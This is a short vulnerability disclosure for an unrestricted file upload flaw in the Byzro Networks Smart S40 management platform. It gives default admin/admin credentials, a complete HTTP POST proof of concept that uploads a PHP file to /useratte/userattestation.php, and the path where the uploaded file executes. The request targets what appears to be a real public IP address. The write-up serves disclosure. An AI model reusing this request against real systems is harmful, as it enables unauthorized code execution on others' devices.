There is a file upload vulnerability in Byzro Networks Smart S40 management platform

Vulnerability impact:S40

Vulnerability location:/useratte/userattestation.php

The code enters the hidwel branch, and the uploaded files in lines 125 and 126 of the code do not have any suffix restrictions, causing arbitrary files to be uploaded.
![image](https://github.com/cqliuke/cve/assets/123135436/dea62da7-1b34-4068-93bb-519dbb453b72)


1. The login interface is as shown in the figure.
admin/admin
![image](https://github.com/cqliuke/cve/assets/123135436/eb99f56d-ab2c-4a18-852d-30b1b916c8b7)


2. Construct a POC and directly upload the 1.php file.

POC
```
POST /useratte/userattestation.php HTTP/1.1
Host: 221.178.130.210:8443
Cookie: PHPSESSID=c618a82c2797b87cf6fceebb4ed5b678
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 592
Origin: https://221.178.130.210:8443
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="web_img"; filename="1.php"
Content-Type: application/octet-stream

<?php echo 1234;?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hidwel"

set
-----------------------------42328904123665875270630079328?
```
![image](https://github.com/cqliuke/cve/assets/123135436/8f5589cd-8047-4c4f-afea-b2ab7ef1a550)

3. Visit /boot/web/upload/weblogo/1.php
![image](https://github.com/cqliuke/cve/assets/123135436/9cd182ef-0e8a-438a-87c4-fa9784e427e6)

   
